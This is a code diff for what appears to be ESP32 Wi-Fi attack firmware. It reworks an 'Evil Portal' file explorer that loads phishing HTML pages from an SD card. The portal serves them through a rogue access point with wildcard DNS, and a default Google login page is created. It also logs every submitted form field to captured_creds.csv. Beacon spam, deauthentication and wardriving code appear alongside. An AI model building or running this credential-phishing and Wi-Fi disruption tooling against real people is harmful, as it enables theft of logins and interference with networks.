@@ -16,12 +16,6 @@ extern bool inMenu;
 extern byte currentMenu, wifiMenuIndex;
 extern void OLED_printMenu(Adafruit_SH1106G &display, byte menuIndex);
 
-#define MAX_FILES 50
-String portalList[MAX_FILES];
-int portalCount = 0;
-int portalIndex = 0;
-bool inPortalExplorer = false;
-
 bool inSpamMenu = false, isSpamming = false;
 bool inEvilPortal = false, apRunning = false;
 bool inDeauthMenu = false, isScanning = false, isDeauthing = false;
@@ -150,6 +144,123 @@ uint8_t beaconPacket[109] = {
   0x00, 0x00
 };
 
+#define MAX_PORTAL_FILES 50
+struct PortalFileEntry {
+  String name;
+  bool isDir;
+};
+PortalFileEntry portalFileList[MAX_PORTAL_FILES];
+int portalFileCount = 0;
+int portalFileIndex = 0;
+bool inPortalExplorer = false;
+String portalCurrentDir = "/WiFi/Portals";
+String getCurrentPortalHtml = "";
+
+void loadPortalFileList() {
+  portalFileCount = 0;
+  if (!SD.exists(portalCurrentDir)) {
+    SD.mkdir(portalCurrentDir);
+  }
+
+  createDefaultPortal();
+
+  File dir = SD.open(portalCurrentDir);
+  if (!dir) return;
+
+  // Сначала папки
+  while (portalFileCount < MAX_PORTAL_FILES) {
+    File entry = dir.openNextFile();
+    if (!entry) break;
+    if (entry.isDirectory()) {
+      String name = entry.name();
+      name = name.substring(name.lastIndexOf('/') + 1);
+      portalFileList[portalFileCount] = {name, true};
+      portalFileCount++;
+    }
+    entry.close();
+  }
+
+  dir.rewindDirectory();
+  // Потом файлы .html и .htm
+  while (portalFileCount < MAX_PORTAL_FILES) {
+    File entry = dir.openNextFile();
+    if (!entry) break;
+    if (!entry.isDirectory()) {
+      String name = entry.name();
+      name = name.substring(name.lastIndexOf('/') + 1);
+      if (name.endsWith(".html") || name.endsWith(".htm")) {
+        portalFileList[portalFileCount] = {name, false};
+        portalFileCount++;
+      }
+    }
+    entry.close();
+  }
+  dir.close();
+}
+
+void drawPortalExplorer() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SH110X_WHITE);
+  display.setTextWrap(false);
+
+  String path = portalCurrentDir;
+  if (path.length() > 21) path = "..." + path.substring(path.length() - 18);
+  display.setCursor(0, 0);
+  display.println(path);
+  display.drawLine(0, 10, 127, 10, SH110X_WHITE);
+
+  if (portalFileCount == 0) {
+    display.setCursor(0, 24);
+    display.println(F("No files/folders"));
+    display.display();
+    return;
+  }
+
+  const int perPage = 4;
+  int startIdx = portalFileIndex - (portalFileIndex % perPage);
+  if (startIdx > portalFileCount - perPage) startIdx = max(0, portalFileCount - perPage);
+
+  for (int i = 0; i < perPage; i++) {
+    int idx = startIdx + i;
+    if (idx >= portalFileCount) break;
+
+    int y = 14 + i * 12;
+    String name = portalFileList[idx].name;
+    if (portalFileList[idx].isDir) name = "[" + name + "]";
+
+    if (name.length() > 20) name = name.substring(0, 17) + "...";
+
+    if (idx == portalFileIndex) {
+      display.fillRect(0, y - 1, 128, 12, SH110X_WHITE);
+      display.setTextColor(SH110X_BLACK);
+    } else {
+      display.setTextColor(SH110X_WHITE);
+    }
+    display.setCursor(4, y);
+    display.println(name);
+  }
+  display.display();
+}
+
+bool loadSelectedPortal() {
+  String fullPath = portalCurrentDir + "/" + portalFileList[portalFileIndex].name;
+  File file = SD.open(fullPath, FILE_READ);
+  if (!file) {
+    Serial.print(F("Failed to open portal: "));
+    Serial.println(fullPath);
+    return false;
+  }
+  getCurrentPortalHtml = "";
+  while (file.available()) {
+    getCurrentPortalHtml += (char)file.read();
+  }
+  file.close();
+  Serial.print(F("Portal loaded: "));
+  Serial.println(fullPath);
+  return true;
+}
+
 String getCurrentWardrivingFileName() {
   return "/WiFi/Wardriving/Wardriving_" + String(wardrivingFileNumber) + ".txt";
 }
@@ -196,7 +307,7 @@ void displayEvilPortalScreen() {
     if (secondLine.length() > 20) secondLine = secondLine.substring(0, 17) + "...";
     display.println(firstLine);
     if (display.getCursorY() < 50 && secondLine != "") {
-      display.setCursor(0, display.getCursorY() + 10); // Add 10 pixels for blank line
+      display.setCursor(0, display.getCursorY() + 10);
       display.println(secondLine);
     }
   }
@@ -298,13 +409,6 @@ void beaconSpamList(const char list[]) {
       esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
       if (result == ESP_OK) {
         packetCounter++;
-        Serial.print(F("Packet #"));
-        Serial.println(packetCounter);
-      } else {
-        Serial.print(F("Packet failed: "));
-        Serial.println(result, HEX);
-        isSpamming = false;
-        return;
       }
     }
 
@@ -319,7 +423,6 @@ void beaconSpamList(const char list[]) {
         isSpamming = false;
         WiFi.mode(WIFI_OFF);
         esp_wifi_set_promiscuous(false);
-        Serial.println(F("WiFi spam stopped"));
         return;
       }
     }
@@ -333,39 +436,27 @@ void handlePostRequest() {
     String argName = server.argName(i);
     String argValue = server.arg(i);
     
-    // Skip irrelevant or unwanted parameters
     if (argName == "q" || argName.startsWith("cup2") || argName.startsWith("plain") ||
         argName == "P1" || argName == "P2" || argName == "P3" || argName == "P4") {
       continue;
     }
     
-    // Build capturedData for display (only value, no key)
     capturedData += argValue + "\n";
     
-    // Build CSV line (key:value,)
     if (i > 0) csvLine += ",";
     csvLine += argName + ":" + argValue;
-    
-    Serial.print(argName + ": ");
-    Serial.println(argValue);
   }
   
-  if (capturedData == "") {
-    capturedData = "No valid data";
-  }
+  if (capturedData == "") capturedData = "No valid data";
   
-  // Save to CSV file on SD card asynchronously
   saveCapturedDataToCSV(csvLine);
   
-  // Immediate feedback
   digitalWrite(2, HIGH);
   delay(50);
   digitalWrite(2, LOW);
   
-  // Update display
   displayEvilPortalScreen();
   
-  // Send redirect response immediately
   server.sendHeader("Location", "/");
   server.send(302, "text/plain", "");
 }
@@ -374,29 +465,18 @@ void saveCapturedDataToCSV(String csvLine) {
   if (csvLine == "") return;
   
   String filePath = "/WiFi/Portals/captured_creds.csv";
-  
   File file = SD.open(filePath, FILE_APPEND);
-  if (!file) {
-    Serial.println(F("Failed to open CSV file for appending"));
-    return;
-  }
-  
+  if (!file) return;
   file.println(csvLine);
   file.close();
-  Serial.println(F("Captured data saved to CSV"));
 }
-
-String getCurrentPortalHtml = "";
 
 void createDefaultPortal() {
   String path = "/WiFi/Portals/Google.html";
   if (SD.exists(path)) return;
 
   File file = SD.open(path, FILE_WRITE);
-  if (!file) {
-    Serial.println(F("Failed to create Google.html"));
-    return;
-  }
+  if (!file) return;
 
   const char* p = portalHtml;
   char c;
@@ -404,93 +484,6 @@ void createDefaultPortal() {
     file.write(c);
   }
   file.close();
-  Serial.println(F("Created Google.html on SD"));
-}
-
-void loadPortalList() {
-  if (!SD.exists("/WiFi/Portals")) SD.mkdir("/WiFi/Portals");
-  createDefaultPortal();
-
-  portalCount = 0;
-  File dir = SD.open("/WiFi/Portals");
-  if (!dir) {
-    Serial.println(F("Failed to open /WiFi/Portals"));
-    return;
-  }
-  while (portalCount < MAX_FILES) {
-    File entry = dir.openNextFile();
-    if (!entry) break;
-    if (!entry.isDirectory()) {
-      String name = entry.name();
-      if (name.endsWith(".html")) {
-        portalList[portalCount] = name;
-        portalCount++;
-      }
-    }
-    entry.close();
-  }
-  dir.close();
-  Serial.print(F("Found "));
-  Serial.print(portalCount);
-  Serial.println(F(" .html files"));
-}
-
-String loadHtmlFromSD(String filename) {
-  String path = "/WiFi/Portals/" + filename;
-  File file = SD.open(path, FILE_READ);
-  if (!file) {
-    Serial.print(F("Failed to open "));
-    Serial.println(path);
-    return "";
-  }
-  String html = "";
-  while (file.available()) {
-    html += (char)file.read();
-  }
-  file.close();
-  
-  // Extract AP name from custom HTML comment
-  int apStart = html.indexOf("<!-- AP=\"");
-  if (apStart != -1) {
-    int apEnd = html.indexOf("\" -->", apStart);
-    if (apEnd != -1) {
-      String extractedApName = html.substring(apStart + 9, apEnd);
-      Serial.print(F("Extracted AP name from HTML: "));
-      Serial.println(extractedApName);
-    }
-  }
-  
-  return html;
-}
-
-void displayPortalExplorer() {
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextWrap(false);
-
-  if (portalCount == 0) {
-    display.setTextColor(SH110X_WHITE);
-    display.setCursor(0, 0);
-    display.println(F("No .html files"));
-    display.display();
-    return;
-  }
-
-  int startIndex = portalIndex - (portalIndex % 5);
-  for (int i = 0; i < 5 && (startIndex + i) < portalCount; i++) {
-    int idx = startIndex + i;
-    String name = portalList[idx];
-    if (name.length() > 16) name = name.substring(0, 16);
-    if (idx == portalIndex) {
-      display.fillRect(0, i * 12, 128, 12, SH110X_WHITE);
-      display.setTextColor(SH110X_BLACK);
-    } else {
-      display.setTextColor(SH110X_WHITE);
-    }
-    display.setCursor(0, i * 12);
-    display.println(name);
-  }
-  display.display();
 }
 
 void startEvilPortal() {
@@ -506,14 +499,12 @@ void startEvilPortal() {
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
 
   server.on("/", HTTP_GET, []() {
-    Serial.println(F("Request: /"));
     server.send(200, "text/html", getCurrentPortalHtml.c_str());
   });
 
   server.on("/post", HTTP_POST, handlePostRequest);
 
   server.onNotFound([]() {
-    Serial.println("Request: " + server.uri());
     if (server.method() == HTTP_POST || server.args() > 0) {
       handlePostRequest();
     } else {
@@ -527,7 +518,6 @@ void startEvilPortal() {
 }
 
 void stopEvilPortal() {
-  Serial.println(F("AP stopped"));
   server.close();
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
@@ -536,13 +526,12 @@ void stopEvilPortal() {
   apRunning = false;
   capturedData = "";
   digitalWrite(2, LOW);
-  // Reinitialize SD card after WiFi AP mode
+
   extern SPIClass sdSPI;
   sdSPI.end();
   delay(100);
   sdSPI.begin(SD_CLK, SD_MISO, SD_MOSI);
   SD.begin(-1, sdSPI);
-  Serial.println(F("SD card and SPI reinitialized after WiFi AP"));
 }
 
 void startWardriving() {
@@ -556,7 +545,6 @@ void startWardriving() {
   String fileName = getCurrentWardrivingFileName();
   wardrivingFile = SD.open(fileName, FILE_WRITE);
   if (wardrivingFile) {
-    Serial.println(F("Wardriving file opened"));
     wardrivingFile.println(F("Wardriving started."));
     wardrivingFile.println(F("=================="));
   }
@@ -564,7 +552,6 @@ void startWardriving() {
   foundNetworks = 0;
   lastScanTime = 0;
   WiFi.scanNetworks(true, true);
-  Serial.println(F("Starting Wardriving"));
   displayWardrivingActive();
 }
 
@@ -579,14 +566,11 @@ void finishWardriving() {
   isWardriving = false;
   wardrivingFileNumber++;
   foundNetworks = 0;
-  Serial.println(F("Wardriving finished"));
 }
 
 bool isNetworkUnique(String ssid, uint8_t* bssid) {
   for (int i = 0; i < foundNetworks; i++) {
-    if (ssid == ssidList[i] && memcmp(bssid, bssidList[i], 6) == 0) {
-      return false;
-    }
+    if (ssid == ssidList[i] && memcmp(bssid, bssidList[i], 6) == 0) return false;
   }
   return true;
 }
@@ -600,13 +584,6 @@ void scanNetworks() {
           wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(i);
           if (record) {
             String ssid = WiFi.SSID(i);
-            String bssid;
-            char bssidStr[18];
-            snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                     record->bssid[0], record->bssid[1], record->bssid[2],
-                     record->bssid[3], record->bssid[4], record->bssid[5]);
-            bssid = String(bssidStr);
-
             if (isNetworkUnique(ssid, record->bssid)) {
               for (int j = min(foundNetworks, 9); j > 0; j--) {
                 ssidList[j] = ssidList[j - 1];
@@ -621,16 +598,7 @@ void scanNetworks() {
               wardrivingFile.print(foundNetworks);
               wardrivingFile.print(F(". "));
               wardrivingFile.println(ssid);
-              wardrivingFile.print(F("MAC: "));
-              wardrivingFile.println(bssid);
-              wardrivingFile.print(F("Enc: "));
-              wardrivingFile.println(record->authmode == WIFI_AUTH_OPEN ? F("Open") : 
-                                    record->authmode == WIFI_AUTH_WEP ? F("WEP") : 
-                                    record->authmode == WIFI_AUTH_WPA_PSK ? F("WPA") : 
-                                    record->authmode == WIFI_AUTH_WPA2_PSK ? F("WPA2") : F("Other"));
-              wardrivingFile.print(F("RSSI: "));
               wardrivingFile.println(record->rssi);
-              wardrivingFile.println(F("------------------------"));
             }
           }
         }
@@ -654,21 +622,14 @@ void handleWardriving() {
   }
 
   if (buttonOK.isClick()) {
-    if (!isWardriving) {
-      startWardriving();
-    } else {
-      finishWardriving();
-      displayWardrivingPrompt();
-    }
+    if (!isWardriving) startWardriving();
+    else { finishWardriving(); displayWardrivingPrompt(); }
   }
 
   if (buttonBack.isClick()) {
-    if (isWardriving) {
-      finishWardriving();
-    }
+    if (isWardriving) finishWardriving();
     inWardriving = false;
     displayWiFiMenu(display, wifiMenuIndex);
-    Serial.println(F("Back to WiFi submenu"));
   }
 }
 
@@ -794,44 +755,54 @@ void handleWiFiSubmenu() {
 
   if (inEvilPortal) {
     if (inPortalExplorer) {
-      displayPortalExplorer();
+      drawPortalExplorer();
+
       if (buttonUp.isClick()) {
-        portalIndex = (portalIndex == 0) ? (portalCount - 1) : portalIndex - 1;
-        displayPortalExplorer();
+        portalFileIndex = (portalFileIndex == 0) ? (portalFileCount - 1) : portalFileIndex - 1;
       }
       if (buttonDown.isClick()) {
-        portalIndex = (portalIndex == portalCount - 1) ? 0 : portalIndex + 1;
-        displayPortalExplorer();
+        portalFileIndex = (portalFileIndex == portalFileCount - 1) ? 0 : portalFileIndex + 1;
       }
-      if (buttonOK.isClick() && portalCount > 0) {
-        String selectedFile = portalList[portalIndex];
-        getCurrentPortalHtml = loadHtmlFromSD(selectedFile);
-        if (getCurrentPortalHtml == "") {
-          display.clearDisplay();
-          display.setTextSize(1);
-          display.setTextColor(SH110X_WHITE);
-          display.setCursor(0, 0);
-          display.println(F("Failed to load HTML"));
-          display.display();
-          delay(2000);
-          displayPortalExplorer();
-          return;
+
+      if (buttonOK.isClick() && portalFileCount > 0) {
+        if (portalFileList[portalFileIndex].isDir) {
+          portalCurrentDir += "/" + portalFileList[portalFileIndex].name;
+          portalFileIndex = 0;
+          portalFileCount = 0;
+          loadPortalFileList();
+          drawPortalExplorer();
+        } else {
+          if (loadSelectedPortal()) {
+            inPortalExplorer = false;
+            startEvilPortal();
+          } else {
+            display.clearDisplay();
+            display.setCursor(0, 20);
+            display.println(F("Load failed!"));
+            display.display();
+            delay(1500);
+          }
         }
-        inPortalExplorer = false;
-        startEvilPortal();
-        Serial.print(F("Starting Evil Portal with "));
-        Serial.println(selectedFile);
       }
+
       if (buttonBack.isClick()) {
-        inEvilPortal = false;
-        inPortalExplorer = false;
-        display.clearDisplay();
-        inMenu = true;
-        wifiMenuIndex = 0;
-        OLED_printMenu(display, currentMenu);
-        Serial.println(F("Back to main menu from EvilPortal explorer"));
-        delay(200);
+        if (portalCurrentDir != "/WiFi/Portals") {
+          int last = portalCurrentDir.lastIndexOf('/');
+          portalCurrentDir = portalCurrentDir.substring(0, last);
+          portalFileIndex = 0;
+          portalFileCount = 0;
+          loadPortalFileList();
+          drawPortalExplorer();
+        } else {
+          inEvilPortal = false;
+          inPortalExplorer = false;
+          inMenu = true;
+          currentMenu = 0;
+          OLED_printMenu(display, currentMenu);
+          Serial.println(F("Back to MAIN MENU from Evil Portal"));
+        }
       }
+      return;
     } else {
       server.handleClient();
       dnsServer.processNextRequest();
@@ -839,24 +810,25 @@ void handleWiFiSubmenu() {
       if (buttonBack.isClick()) {
         stopEvilPortal();
         inEvilPortal = false;
-        display.clearDisplay();
         displayWiFiMenu(display, wifiMenuIndex);
-        delay(200);
-        Serial.println(F("Evil Portal stopped"));
       }
+      return;
     }
+  }
+
+  if (buttonOK.isClick() && wifiMenuIndex == 2) {
+    inEvilPortal = true;
+    inPortalExplorer = true;
+    portalCurrentDir = "/WiFi/Portals";
+    portalFileIndex = 0;
+    portalFileCount = 0;
+    loadPortalFileList();
+    drawPortalExplorer();
     return;
   }
 
-  if (inDeauthMenu) {
-    handleDeauthSubmenu();
-    return;
-  }
-
-  if (inWardriving) {
-    handleWardriving();
-    return;
-  }
+  if (inDeauthMenu) { handleDeauthSubmenu(); return; }
+  if (inWardriving) { handleWardriving(); return; }
 
   if (inSpamMenu) {
     if (!isSpamming) displaySpamPrompt();
@@ -869,23 +841,19 @@ void handleWiFiSubmenu() {
     if (buttonUp.isClick()) {
       wifiMenuIndex = (wifiMenuIndex - 1 + WIFI_MENU_ITEM_COUNT) % WIFI_MENU_ITEM_COUNT;
       displayWiFiMenu(display, wifiMenuIndex);
-      Serial.println(F("WiFi menu Up"));
     }
     if (buttonDown.isClick()) {
       wifiMenuIndex = (wifiMenuIndex + 1) % WIFI_MENU_ITEM_COUNT;
       displayWiFiMenu(display, wifiMenuIndex);
-      Serial.println(F("WiFi menu Down"));
     }
   }
 
   if (buttonOK.isClick()) {
-    Serial.println(F("WiFi menu OK"));
     if (wifiMenuIndex == 0) {
       inDeauthMenu = true;
       isScanning = true;
       WiFi.mode(WIFI_STA);
       WiFi.disconnect();
-      Serial.println(F("Starting WiFi scan"));
     } else if (wifiMenuIndex == 1) {
       if (!inSpamMenu) {
         inSpamMenu = true;
@@ -895,25 +863,22 @@ void handleWiFiSubmenu() {
         if (isSpamming) {
           init_deauth_wifi();
           displaySpamActive();
-          Serial.println(F("Starting WiFi spam"));
         } else {
           WiFi.mode(WIFI_OFF);
           displaySpamPrompt();
-          Serial.println(F("Stopping WiFi spam"));
         }
       }
     } else if (wifiMenuIndex == 2) {
       inEvilPortal = true;
       inPortalExplorer = true;
-      portalIndex = 0;
-      portalCount = 0;
-      loadPortalList();
-      displayPortalExplorer();
-      Serial.println(F("Entering Evil Portal explorer"));
+      portalCurrentDir = "/WiFi/Portals";
+      portalFileIndex = 0;
+      portalFileCount = 0;
+      loadPortalFileList();
+      drawPortalExplorer();
     } else if (wifiMenuIndex == 3) {
       inWardriving = true;
       displayWardrivingPrompt();
-      Serial.println(F("Entering Wardriving"));
     }
   }
 
@@ -922,16 +887,13 @@ void handleWiFiSubmenu() {
       if (isSpamming) {
         isSpamming = false;
         WiFi.mode(WIFI_OFF);
-        Serial.println(F("Stopping WiFi spam"));
       }
       inSpamMenu = false;
       displayWiFiMenu(display, wifiMenuIndex);
-      Serial.println(F("Back to WiFi submenu"));
     } else {
       inMenu = true;
       wifiMenuIndex = 0;
       OLED_printMenu(display, currentMenu);
-      Serial.println(F("Back to main menu"));
     }
   }
 
